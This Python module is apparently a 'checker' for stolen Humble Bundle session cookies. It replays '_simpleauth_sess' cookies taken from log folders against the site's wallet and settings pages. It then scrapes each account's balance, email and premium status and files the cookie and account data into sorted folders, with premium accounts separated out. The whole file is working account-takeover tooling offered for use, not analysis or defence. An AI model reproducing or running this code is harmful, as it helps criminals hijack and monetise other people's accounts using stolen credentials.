# -*- coding: utf-8 -*-
import re
import random
import shutil
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
import StandartMethod

class humblebundle_checker():


	@staticmethod
	def create_file(create_path: str,cook: str, path: str, balanc: str, email: str, prem: bool, file: str):
		email = StandartMethod.StandartMetod.validate(email)
		dir_path = create_path + f"\\{email} - Balans({balanc}) - Prem({str(prem)})"
		try:
			os.mkdir(dir_path)
		except OSError as error:
			pass
		data = {
			'Path': path,
			'Cookie': cook,
			'Account Info': {
				'Email': email ,
				'Balanc': balanc,
				'Premium': prem
			}
		}
		with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
			json.dump(data, outfile, indent=4, ensure_ascii=False)
		shutil.copy(f'{file}\\{path}', f'{dir_path}\\{path}')
		settings = StandartMethod.headless.get_settings()['Filter_settings']['Humblebundle']

		try:
			os.mkdir(f'{create_path}\\{settings["Full_log"]}')
		except:
			pass
		try:
			os.mkdir(f'{create_path}\\{settings["Premium_path"]}')
		except:
			pass

		path_premium_log = f'{create_path}\\{settings["Premium_path"]}\\{email} - Balans({balanc}) - Prem({str(prem)})'
		if str(settings['Filter_premium']) == str(prem):
			try:
				os.mkdir(path_premium_log)
			except:
				pass
			with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
				json.dump(data, outfile, indent=4, ensure_ascii=False)
			shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{path}')
		shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Full_log"]}\\{path}')

	@staticmethod
	def checker(dict, account, path_log, file):
		headers = StandartMethod.StandartMetod.get_headers()
		cook = {
			"_simpleauth_sess": account['_simpleauth_sess'],
		}
		req = requests.get('https://www.humblebundle.com/user/wallet?hmb_source=navbar', cookies=cook, headers=headers)
		try:
			soup = BeautifulSoup(req.text, 'lxml')
			balanc = soup.find('div', class_='balance').find('div').find_all('span')[-1].text
			req = requests.get('https://www.humblebundle.com/user/settings?hmb_source=navbar', cookies=cook, headers=headers)
			soup = BeautifulSoup(req.text, 'lxml')
			email = soup.find('input', id="email").get('value')
			prem = True
			try:
				premium = soup.find('section', id='subscription-details').find('strong').text
				if 'не' in premium or 'non' in premium or 'not' in premium or '目前还不是会员' in premium or '不是' in premium or 'kein' in premium or 'no' in premium:
					prem = False
			except:
				pass
			humblebundle_checker.create_file(f'{dict}', account['_simpleauth_sess'], path_log, balanc, email, prem, file)
		except Exception as ex:
			pass